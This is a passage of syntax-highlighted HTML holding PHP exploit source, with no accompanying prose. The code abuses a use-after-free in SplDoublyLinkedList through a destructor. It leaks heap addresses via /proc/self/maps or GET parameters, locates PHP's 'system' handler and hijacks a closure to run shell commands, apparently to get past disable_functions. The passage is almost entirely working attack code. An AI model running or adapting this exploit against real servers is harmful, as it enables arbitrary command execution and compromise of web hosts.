<span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bomb1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0x5454545454545454</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x7ffff0000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Where is here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bomb2</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">0x200000</span><span class="token punctuation">,</span> <span class="token number">0x200000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Not Found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token number">0x108</span> <span class="token operator">+</span> <span class="token variable">$address</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$x</span> <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0x1234567812345678</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"[+]SplDoublyLinkedList Element: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$y</span> <span class="token operator">*</span> <span class="token number">0x08</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getClosureChunk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">do</span> <span class="token punctuation">{</span>     <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Closure Chunk: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getSystem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$address</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffffff0000</span><span class="token punctuation">;</span>  <span class="token variable">$lowestAddr</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$address</span> <span class="token operator">&amp;</span> <span class="token number">0x0000fffffff00000</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x0000000001000000</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token number">0x80</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">&lt;</span> <span class="token variable">$lowestAddr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>     <span class="token variable">$nameAddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nameAddr</span> <span class="token operator">></span> <span class="token variable">$address</span> <span class="token operator">||</span> <span class="token variable">$nameAddr</span> <span class="token operator">&lt;</span> <span class="token variable">$lowestAddr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">continue</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$nameAddr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_pad</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token constant">STR_PAD_LEFT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">===</span> <span class="token string">"system"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Trigger</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>     <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1234567812345678</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0x1234567812345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]UAF Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>     <span class="token variable">$maps</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$maps</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token function">cantRead</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>       <span class="token function">canRead</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>     <span class="token keyword">echo</span> <span class="token string">"[+]Done"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bypass</span><span class="token punctuation">(</span><span class="token variable">$elementAddress</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$closureChunkAddress</span> <span class="token operator">=</span> <span class="token function">getClosureChunk</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$elementAddress</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get Closure Chunk Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token variable">$closure_object</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closureChunkAddress</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Closure Object: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$closure_object</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Closure Handler: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$system_address</span> <span class="token operator">=</span> <span class="token function">getSystem</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closure_handlers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Couldn't determine system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Find system's handler: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$system_address</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x506</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">0x130</span> <span class="token operator">/</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x08</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x08</span> <span class="token operator">*</span> <span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$system_address</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x108</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"[+]Executing command: \n"</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"php -v"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">canRead</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$chunkAddress</span> <span class="token operator">=</span> <span class="token function">getPHPChunk</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get PHP Chunk Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$elementAddress</span> <span class="token operator">=</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$chunkAddress</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get SplDoublyLinkedList Element Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token function">bypass</span><span class="token punctuation">(</span><span class="token variable">$elementAddress</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">cantRead</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Please try to get address of PHP Chunk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">bomb1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$elementAddress</span> <span class="token operator">=</span> <span class="token function">bomb2</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$elementAddress</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get SplDoublyLinkedList Element Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token function">bypass</span><span class="token punctuation">(</span><span class="token variable">$elementAddress</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplDoublyLinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"Twings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0x1234567812345678</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><sp